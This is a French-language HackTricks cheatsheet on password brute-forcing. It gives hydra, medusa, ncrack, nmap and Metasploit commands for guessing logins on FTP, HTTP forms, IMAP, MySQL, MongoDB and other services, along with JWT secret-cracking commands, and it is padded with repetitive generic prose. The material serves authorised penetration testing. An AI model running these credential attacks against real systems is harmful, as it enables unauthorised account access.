# Brute Force - CheatSheet

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire facilement et **automatiser des flux de travail** alimentés par les outils communautaires les plus avancés au monde.\
Obtenez un accès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Identifiants par défaut

**Recherchez sur Google** les identifiants par défaut de la technologie utilisée, ou **essayez ces liens** :

* [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
* [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
* [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
* [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
* [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
* [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
* [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
* [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
* [**https://many-passwords.github.io/**](https://many-passwords.github.io)
* [**https://theinfocentric.com/**](https://theinfocentric.com/)

## **Créez vos propres dictionnaires**

Trouvez autant d'informations que possible sur la cible et générez un dictionnaire personnalisé. Des outils qui peuvent aider :

### Crunch
```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```
### Cewl

Cewl est un outil de génération de listes de mots-clés à partir de pages Web. Il analyse le contenu des pages et extrait les mots-clés pertinents. Cela peut être utile lors de l'exécution d'une attaque par force brute, car cela permet de générer une liste de mots-clés potentiels à utiliser comme mots de passe.

Pour utiliser Cewl, vous devez spécifier l'URL de la page Web à analyser et le nombre de mots-clés à extraire. L'outil parcourt ensuite la page, extrait les mots-clés et les enregistre dans un fichier texte.

Cewl peut également être utilisé pour générer des listes de mots-clés à partir de plusieurs pages Web. Il suffit de spécifier une liste d'URL à analyser et l'outil se chargera de les parcourir une par une.

Une fois que vous avez généré une liste de mots-clés avec Cewl, vous pouvez l'utiliser avec d'autres outils de force brute pour tenter de deviner des mots de passe. Par exemple, vous pouvez utiliser la liste de mots-clés comme dictionnaire pour une attaque par force brute sur un service en ligne.

Cewl est un outil puissant pour générer des listes de mots-clés à partir de pages Web, ce qui peut être très utile lors de l'exécution d'attaques par force brute.
```bash
cewl example.com -m 5 -w words.txt
```
### [CUPP](https://github.com/Mebus/cupp)

Générer des mots de passe basés sur vos connaissances sur la victime (noms, dates...)
```
python3 cupp.py -h
```
### [Wister](https://github.com/cycurity/wister)

Un outil de génération de listes de mots qui vous permet de fournir un ensemble de mots, vous donnant la possibilité de créer plusieurs variations à partir des mots donnés, créant ainsi une liste de mots unique et idéale à utiliser pour une cible spécifique.
```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

__          _______  _____ _______ ______ _____
\ \        / /_   _|/ ____|__   __|  ____|  __ \
\ \  /\  / /  | | | (___    | |  | |__  | |__) |
\ \/  \/ /   | |  \___ \   | |  |  __| |  _  /
\  /\  /   _| |_ ____) |  | |  | |____| | \ \
\/  \/   |_____|_____/   |_|  |______|_|  \_\

Version 1.0.3                    Cycurity

Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```
### [pydictor](https://github.com/LandGrey/pydictor)

### Listes de mots

* [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
* [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/google/fuzzing/tree/master/dictionaries)
* [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
* [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
* [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
* [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
* [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
* [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour créer et **automatiser facilement** des flux de travail alimentés par les outils communautaires les plus avancés au monde.\
Accédez dès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Services

Classés par ordre alphabétique selon le nom du service.

### AFP
```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```
### AJP

L'attaque par force brute est une technique couramment utilisée pour tenter de deviner un mot de passe en essayant toutes les combinaisons possibles jusqu'à ce que la bonne soit trouvée. L'attaque par force brute peut être utilisée pour attaquer divers protocoles, y compris le protocole AJP (Apache JServ Protocol).

Le protocole AJP est un protocole de communication utilisé pour transférer les requêtes entre un serveur web et un serveur d'applications. Il est souvent utilisé pour la communication entre un serveur web Apache et un serveur d'applications Java, tel que Tomcat.

L'attaque par force brute contre le protocole AJP implique de tenter de deviner les identifiants d'authentification en essayant différentes combinaisons de noms d'utilisateur et de mots de passe. Cette attaque peut être automatisée à l'aide d'outils spécifiques, tels que Hydra ou Medusa, qui peuvent essayer de nombreuses combinaisons en peu de temps.

Il est important de noter que l'attaque par force brute est une méthode d'attaque relativement simple mais qui peut être très lente et nécessiter beaucoup de ressources. De plus, elle peut être détectée par des mécanismes de sécurité tels que les systèmes de détection d'intrusion (IDS) ou les systèmes de prévention d'intrusion (IPS).

Pour se protéger contre les attaques par force brute, il est recommandé d'utiliser des mots de passe forts et de mettre en place des mécanismes de verrouillage des comptes après un certain nombre de tentatives infructueuses. De plus, il est important de garder les logiciels à jour avec les derniers correctifs de sécurité pour réduire les vulnérabilités potentielles.
```bash
nmap --script ajp-brute -p 8009 <IP>
```
### Cassandra

Cassandra est une base de données distribuée hautement évolutive, conçue pour gérer de gros volumes de données sur de nombreux serveurs, offrant une haute disponibilité et une tolérance aux pannes. Elle utilise un modèle de données colonne et est conçue pour être résiliente aux pannes matérielles et aux pannes de réseau.

#### Brute Force

La méthode de force brute est une technique utilisée pour tenter de deviner un mot de passe en essayant toutes les combinaisons possibles jusqu'à ce que la bonne soit trouvée. Cette méthode est souvent utilisée lorsque d'autres méthodes, telles que l'ingénierie sociale ou l'utilisation de logiciels malveillants, ne sont pas efficaces.

La force brute peut être utilisée pour attaquer des systèmes tels que des comptes utilisateur, des serveurs, des applications web, etc. Elle peut être réalisée à l'aide d'outils automatisés qui génèrent et testent automatiquement les combinaisons de mots de passe, ou elle peut être effectuée manuellement en essayant différentes combinaisons de mots de passe.

Il est important de noter que la force brute est une méthode de piratage illégale et non éthique, et son utilisation peut entraîner des conséquences juridiques graves. Il est donc essentiel de respecter les lois et les réglementations en vigueur lors de l'utilisation de techniques de piratage.
```bash
nmap --script cassandra-brute -p 9160 <IP>
```
# CouchDB

CouchDB est une base de données NoSQL open source qui utilise JSON pour stocker les données. Elle est conçue pour être distribuée et tolérante aux pannes, ce qui signifie qu'elle peut fonctionner sur plusieurs serveurs et résister à la défaillance d'un ou plusieurs d'entre eux.

CouchDB utilise une approche de réplication bidirectionnelle, ce qui signifie que les données peuvent être synchronisées entre plusieurs instances de CouchDB. Cela permet une haute disponibilité des données et facilite la mise en place de clusters de bases de données.

Lorsqu'il s'agit de pirater CouchDB, l'une des méthodes les plus courantes est l'attaque par force brute. Cette technique consiste à essayer toutes les combinaisons possibles de noms d'utilisateur et de mots de passe jusqu'à ce que la bonne combinaison soit trouvée.

Pour mener une attaque par force brute sur CouchDB, vous pouvez utiliser des outils tels que Hydra ou Medusa. Ces outils automatisent le processus en testant rapidement de nombreuses combinaisons de noms d'utilisateur et de mots de passe.

Il est important de noter que l'attaque par force brute est une méthode d'attaque très lente et bruyante. Elle peut être détectée facilement par les systèmes de détection d'intrusion et peut entraîner le blocage de l'adresse IP de l'attaquant.

Pour réduire les risques d'attaque par force brute sur CouchDB, il est recommandé de mettre en place des mesures de sécurité telles que l'utilisation de mots de passe forts, la limitation du nombre de tentatives de connexion et la surveillance des journaux d'accès pour détecter les activités suspectes.

En conclusion, CouchDB est une base de données NoSQL populaire, mais elle peut être vulnérable aux attaques par force brute. Il est essentiel de prendre des mesures de sécurité appropriées pour protéger vos données.
```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```
### Registre Docker

Le registre Docker est un service qui permet de stocker et de distribuer des images Docker. Il peut être utilisé pour héberger des images personnalisées ou pour accéder à des images publiques disponibles sur Internet. Le registre Docker est essentiel pour le déploiement et la gestion des conteneurs Docker.

#### Attaque par force brute

L'attaque par force brute est une technique utilisée pour tenter de deviner un mot de passe en essayant toutes les combinaisons possibles jusqu'à ce que la bonne soit trouvée. Cette méthode est souvent utilisée pour accéder illégalement à des comptes ou à des systèmes protégés par mot de passe.

Dans le contexte du registre Docker, une attaque par force brute peut être utilisée pour tenter de deviner le mot de passe d'un compte utilisateur afin de compromettre le registre et d'accéder aux images stockées. Cette attaque peut être réalisée en utilisant des outils automatisés qui testent de manière itérative différentes combinaisons de mots de passe jusqu'à ce que le bon soit trouvé.

Pour se protéger contre les attaques par force brute, il est recommandé d'utiliser des mots de passe forts et de mettre en place des mesures de sécurité supplémentaires telles que la limitation du nombre de tentatives de connexion, l'utilisation de l'authentification à deux facteurs et la surveillance des journaux d'accès pour détecter les activités suspectes.

Il est également important de garder le registre Docker à jour en installant les dernières mises à jour de sécurité et en suivant les meilleures pratiques de sécurité recommandées par le fournisseur du registre. En prenant ces mesures, vous pouvez réduire considérablement le risque d'une attaque par force brute réussie sur votre registre Docker.
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```
### Elasticsearch

Elasticsearch est un moteur de recherche et d'analyse de données distribué, basé sur Apache Lucene. Il est conçu pour être rapide, évolutif et facile à utiliser. Elasticsearch est souvent utilisé pour l'indexation et la recherche de grands volumes de données non structurées, tels que des logs, des documents JSON et des données textuelles.

#### Brute Force

La méthode de force brute est une technique utilisée pour tenter de deviner un mot de passe en essayant toutes les combinaisons possibles jusqu'à ce que la bonne soit trouvée. Cette méthode est souvent utilisée lorsque les autres méthodes de récupération de mot de passe échouent. La force brute peut être utilisée pour attaquer des systèmes tels que des serveurs, des applications web et des comptes utilisateur.

Lorsqu'il s'agit d'Elasticsearch, la force brute peut être utilisée pour tenter de deviner les identifiants d'accès à un cluster Elasticsearch. Cela peut être fait en essayant différentes combinaisons de noms d'utilisateur et de mots de passe jusqu'à ce que les bonnes informations d'identification soient trouvées. Il est important de noter que l'utilisation de la force brute pour accéder à un cluster Elasticsearch sans autorisation est illégale et peut entraîner des conséquences juridiques.

Pour se protéger contre les attaques par force brute, il est recommandé de mettre en place des mesures de sécurité telles que l'utilisation de mots de passe forts, la limitation du nombre de tentatives de connexion et la surveillance des journaux d'accès pour détecter les activités suspectes.
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```
### FTP

Le protocole FTP (File Transfer Protocol) est un protocole standard utilisé pour transférer des fichiers entre un client et un serveur sur un réseau. Il est largement utilisé pour le partage de fichiers et la gestion de sites web.

#### Attaque par force brute

L'attaque par force brute est une technique couramment utilisée pour tenter de deviner un mot de passe en essayant toutes les combinaisons possibles jusqu'à ce que la bonne soit trouvée. Dans le contexte du protocole FTP, une attaque par force brute peut être utilisée pour essayer de deviner le mot de passe d'un compte FTP en essayant différentes combinaisons de caractères.

#### Méthodologie

Voici une méthodologie générale pour mener une attaque par force brute sur un serveur FTP :

1. Identifier la cible : déterminer l'adresse IP ou le nom de domaine du serveur FTP que vous souhaitez attaquer.
2. Collecter des informations : recueillir des informations sur le serveur FTP, telles que le port utilisé, les noms d'utilisateur valides, etc.
3. Sélectionner un outil : choisir un outil d'attaque par force brute FTP, tel que Hydra ou Medusa.
4. Configurer l'outil : spécifier les paramètres de l'attaque, tels que l'adresse IP cible, le port, les noms d'utilisateur valides, etc.
5. Lancer l'attaque : exécuter l'outil d'attaque par force brute pour essayer différentes combinaisons de mots de passe.
6. Analyser les résultats : analyser les résultats de l'attaque pour identifier les mots de passe valides.
7. Accéder au compte FTP : utiliser les mots de passe valides pour accéder au compte FTP et effectuer les actions souhaitées.

#### Contre-mesures

Pour se protéger contre les attaques par force brute FTP, voici quelques contre-mesures recommandées :

- Utiliser des mots de passe forts : choisir des mots de passe complexes et difficiles à deviner.
- Limiter les tentatives de connexion : configurer le serveur FTP pour limiter le nombre de tentatives de connexion autorisées.
- Utiliser des outils de détection d'intrusion : mettre en place des outils de détection d'intrusion pour détecter et bloquer les attaques par force brute.
- Mettre à jour régulièrement : maintenir le serveur FTP à jour avec les derniers correctifs de sécurité pour éviter les vulnérabilités connues.

En suivant ces contre-mesures, vous pouvez renforcer la sécurité de votre serveur FTP et réduire les risques d'attaque par force brute.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
```
### Brute force générique HTTP

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### Authentification de base HTTP
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
```
### HTTP - Formulaire de soumission (POST)

L'attaque par force brute est une technique couramment utilisée pour tenter de deviner les informations d'identification d'un utilisateur en testant toutes les combinaisons possibles de mots de passe. Cette méthode peut être utilisée pour attaquer les formulaires de soumission HTTP.

L'attaque par force brute sur un formulaire de soumission HTTP consiste à envoyer des requêtes POST répétées au serveur en utilisant différentes combinaisons de noms d'utilisateur et de mots de passe. L'objectif est de trouver la combinaison correcte qui permettra d'accéder au système.

Voici les étapes générales pour effectuer une attaque par force brute sur un formulaire de soumission HTTP :

1. Identifier le formulaire de soumission : Analysez la page web pour trouver le formulaire de soumission qui accepte les informations d'identification de l'utilisateur.

2. Collecter les informations nécessaires : Notez les noms des champs d'entrée pour le nom d'utilisateur et le mot de passe.

3. Automatiser l'envoi des requêtes POST : Utilisez un script ou un outil d'automatisation pour envoyer des requêtes POST répétées au serveur en utilisant différentes combinaisons de noms d'utilisateur et de mots de passe. Assurez-vous de respecter les limites de vitesse et les politiques de verrouillage du compte pour éviter d'être détecté.

4. Analyser les réponses du serveur : Analysez les réponses du serveur pour déterminer si une combinaison de nom d'utilisateur et de mot de passe est valide. Les réponses peuvent inclure des messages d'erreur spécifiques ou des codes de statut HTTP.

5. Répéter jusqu'à trouver la combinaison correcte : Continuez à envoyer des requêtes POST avec différentes combinaisons de noms d'utilisateur et de mots de passe jusqu'à ce que vous trouviez la combinaison correcte qui permet d'accéder au système.

Il est important de noter que l'attaque par force brute est une méthode lente et risquée, car elle peut être détectée par les systèmes de sécurité et peut entraîner le verrouillage des comptes utilisateur. Il est recommandé de l'utiliser avec prudence et uniquement avec l'autorisation appropriée lors de tests de pénétration ou d'autres activités légales.
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```
Pour http**s**, vous devez changer de "http-post-form" à "**https-post-form**"

### **HTTP - CMS --** (W)ordpress, (J)oomla ou (D)rupal ou (M)oodle
```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
```
### IMAP

IMAP (Internet Message Access Protocol) est un protocole de messagerie électronique utilisé pour récupérer les e-mails à partir d'un serveur de messagerie. Contrairement au protocole POP3, qui télécharge les e-mails sur l'appareil local, IMAP permet aux utilisateurs de gérer leurs e-mails directement sur le serveur. Cela signifie que les modifications apportées aux e-mails, telles que la suppression ou le déplacement dans des dossiers, sont synchronisées avec le serveur. 

Lorsqu'il s'agit de piratage, IMAP peut être exploité en utilisant des techniques de force brute pour deviner les mots de passe des comptes de messagerie. La méthode de force brute consiste à essayer toutes les combinaisons possibles de mots de passe jusqu'à ce que le bon soit trouvé. Cela peut être fait en utilisant des outils automatisés qui testent rapidement de nombreuses combinaisons. 

Il est important de noter que l'utilisation de la force brute pour pirater des comptes de messagerie est illégale et peut entraîner des conséquences juridiques graves. Les pirates informatiques éthiques, également connus sous le nom de testeurs de pénétration, peuvent utiliser des techniques de force brute dans le cadre d'un test de sécurité autorisé pour évaluer la vulnérabilité d'un système.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
```
IRC (Internet Relay Chat) est un protocole de communication en temps réel largement utilisé pour la messagerie instantanée et les discussions en groupe. Il permet aux utilisateurs de se connecter à des serveurs IRC et de rejoindre des canaux de discussion pour communiquer avec d'autres utilisateurs. Les clients IRC sont des applications qui permettent aux utilisateurs de se connecter à des serveurs IRC et de participer aux discussions. Les clients IRC peuvent être utilisés pour discuter avec des amis, rejoindre des communautés en ligne, obtenir de l'aide technique et bien plus encore.
```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```
### ISCSI

L'iSCSI (Internet Small Computer System Interface) est un protocole de stockage en réseau qui permet aux ordinateurs de se connecter à des ressources de stockage distantes sur un réseau IP. Il permet aux utilisateurs d'accéder à des disques durs, des bandes magnétiques et d'autres périphériques de stockage à distance comme s'ils étaient connectés localement. L'iSCSI utilise le protocole TCP/IP pour transférer les données entre l'initiateur (l'ordinateur client) et la cible (le périphérique de stockage distant). Cette technologie est largement utilisée dans les environnements de stockage en réseau pour sa simplicité et sa flexibilité.
```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```
### JWT

JSON Web Tokens (JWT) sont un moyen populaire d'authentification et d'échange de données sécurisé entre des parties. Ils sont généralement utilisés pour authentifier les utilisateurs dans les applications web et les services API.

Un JWT est composé de trois parties : l'en-tête, la charge utile et la signature. L'en-tête contient des informations sur le type de token et l'algorithme de signature utilisé. La charge utile contient les données que vous souhaitez échanger ou stocker. La signature est utilisée pour vérifier l'intégrité du token.

L'une des vulnérabilités courantes liées aux JWT est l'attaque par force brute. Cette attaque consiste à essayer toutes les combinaisons possibles de clés secrètes pour trouver la bonne. Les attaquants peuvent utiliser des dictionnaires de mots de passe couramment utilisés ou générer des clés aléatoires pour tenter de casser la signature du JWT.

Pour se protéger contre les attaques par force brute, il est important de choisir une clé secrète suffisamment longue et complexe. Il est également recommandé d'utiliser des algorithmes de hachage forts pour la signature du JWT. De plus, la mise en place de mécanismes de verrouillage des comptes après un certain nombre de tentatives infructueuses peut également aider à prévenir les attaques par force brute.

En résumé, les JWT sont un moyen pratique d'authentification et d'échange de données sécurisé, mais il est essentiel de prendre des mesures pour se protéger contre les attaques par force brute et de choisir des clés secrètes solides pour garantir la sécurité de vos applications et services.
```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#https://github.com/Sjord/jwtcrack
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```
### LDAP

LDAP (Lightweight Directory Access Protocol) est un protocole de communication utilisé pour accéder et gérer des services d'annuaire. Il est couramment utilisé pour rechercher et authentifier des utilisateurs dans un système d'annuaire centralisé. Les attaques de force brute contre les serveurs LDAP sont une méthode courante utilisée par les hackers pour tenter de deviner les mots de passe des utilisateurs.

L'attaque de force brute consiste à essayer toutes les combinaisons possibles de mots de passe jusqu'à ce que le bon soit trouvé. Les hackers utilisent souvent des dictionnaires de mots de passe couramment utilisés ou génèrent des mots de passe aléatoires pour mener cette attaque. Cette méthode peut être très efficace si les mots de passe sont faibles ou si les politiques de verrouillage de compte ne sont pas en place.

Pour se protéger contre les attaques de force brute LDAP, il est recommandé de mettre en place des politiques de mot de passe solides, d'utiliser des mots de passe complexes et uniques pour chaque compte, et de mettre en place des mécanismes de verrouillage de compte après un certain nombre de tentatives infructueuses. Il est également important de surveiller les journaux d'activité pour détecter toute activité suspecte et de mettre à jour régulièrement les serveurs LDAP avec les derniers correctifs de sécurité.
```bash
nmap --script ldap-brute -p 389 <IP>
```
### MQTT

MQTT (Message Queuing Telemetry Transport) est un protocole de messagerie léger et simple conçu pour les appareils à faible puissance et à faible bande passante. Il est largement utilisé dans l'Internet des objets (IoT) pour la communication entre les appareils connectés.

Le protocole MQTT utilise un modèle de publication/abonnement, où les appareils peuvent publier des messages sur des sujets spécifiques et s'abonner à des sujets pour recevoir des messages. Les messages sont généralement de petites tailles et peuvent être envoyés de manière asynchrone.

L'une des méthodes couramment utilisées pour attaquer les systèmes MQTT est l'attaque par force brute. Cette technique consiste à essayer toutes les combinaisons possibles de noms d'utilisateur et de mots de passe pour accéder à un système MQTT. Les attaquants utilisent souvent des dictionnaires de mots de passe couramment utilisés ou des techniques de génération de mots de passe pour automatiser le processus de force brute.

Pour se protéger contre les attaques par force brute sur MQTT, il est recommandé de mettre en place des mesures de sécurité telles que l'utilisation de mots de passe forts, la limitation du nombre de tentatives de connexion, la mise en place de listes blanches d'adresses IP autorisées et la surveillance des journaux d'activité pour détecter les tentatives d'attaque.

Il est également important de garder à jour les versions du logiciel MQTT utilisé, car les nouvelles versions peuvent inclure des correctifs de sécurité pour contrer les attaques par force brute et d'autres vulnérabilités connues. En outre, il est recommandé de limiter l'accès aux systèmes MQTT uniquement aux utilisateurs autorisés et de mettre en place des pare-feu pour restreindre l'accès aux ports MQTT.

En suivant ces bonnes pratiques de sécurité, il est possible de réduire considérablement les risques d'attaques par force brute sur les systèmes MQTT et de garantir la confidentialité et l'intégrité des données échangées entre les appareils connectés.
```
ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
```
### Mongo

Mongo est une base de données NoSQL populaire qui est souvent utilisée dans les applications web. Il est important de noter que Mongo est vulnérable aux attaques de force brute si des mesures de sécurité appropriées ne sont pas mises en place.

La force brute est une technique d'attaque où un attaquant essaie de deviner un mot de passe en essayant toutes les combinaisons possibles jusqu'à ce qu'il trouve la bonne. Dans le cas de Mongo, cela signifie essayer différentes combinaisons de noms d'utilisateur et de mots de passe jusqu'à ce que l'accès soit accordé.

Il existe plusieurs outils disponibles pour mener des attaques de force brute contre Mongo, tels que Hydra et Nmap. Ces outils peuvent automatiser le processus d'essai de différentes combinaisons de noms d'utilisateur et de mots de passe.

Pour se protéger contre les attaques de force brute, il est recommandé de prendre les mesures suivantes :

- Utiliser des mots de passe forts : Les mots de passe doivent être longs, complexes et uniques pour chaque compte.
- Limiter les tentatives de connexion : Mettre en place des mécanismes de verrouillage des comptes après un certain nombre de tentatives de connexion infructueuses.
- Utiliser l'authentification à deux facteurs : Ajouter une couche de sécurité supplémentaire en exigeant une deuxième forme d'authentification, telle qu'un code généré par une application mobile.
- Mettre à jour régulièrement : S'assurer que Mongo est toujours à jour avec les derniers correctifs de sécurité pour éviter les vulnérabilités connues.

En suivant ces bonnes pratiques de sécurité, vous pouvez réduire considérablement le risque d'une attaque de force brute réussie contre votre base de données Mongo.
```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
```
### MySQL

La méthode de force brute est une technique couramment utilisée pour tenter de deviner les mots de passe d'une base de données MySQL. Cette méthode consiste à essayer toutes les combinaisons possibles de mots de passe jusqu'à ce que le bon soit trouvé.

Il existe plusieurs outils disponibles pour effectuer une attaque de force brute sur une base de données MySQL. Certains de ces outils sont spécifiquement conçus pour MySQL, tandis que d'autres peuvent être utilisés pour attaquer différents types de bases de données.

Lors de l'exécution d'une attaque de force brute sur une base de données MySQL, il est important de prendre en compte certaines considérations. Tout d'abord, il est essentiel de disposer d'une liste de mots de passe couramment utilisés, car de nombreux utilisateurs choisissent des mots de passe faibles et prévisibles. De plus, il est recommandé de limiter le nombre de tentatives de connexion pour éviter de déclencher des mesures de sécurité, telles que le blocage de l'adresse IP.

Il est également important de noter que l'utilisation de la méthode de force brute pour accéder à une base de données MySQL sans autorisation est illégale et peut entraîner des conséquences juridiques graves. Par conséquent, il est essentiel de n'utiliser cette technique que dans le cadre d'un test de pénétration autorisé et éthique.

En conclusion, la méthode de force brute est une technique couramment utilisée pour tenter de deviner les mots de passe d'une base de données MySQL. Cependant, il est important de l'utiliser de manière responsable et légale.
```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql
```
# Brute Force

La méthode de force brute est une technique couramment utilisée en piratage pour tenter de deviner un mot de passe en essayant toutes les combinaisons possibles jusqu'à ce que la bonne soit trouvée. Cette méthode est souvent utilisée lorsque d'autres méthodes, telles que l'ingénierie sociale ou l'exploitation de vulnérabilités, ont échoué.

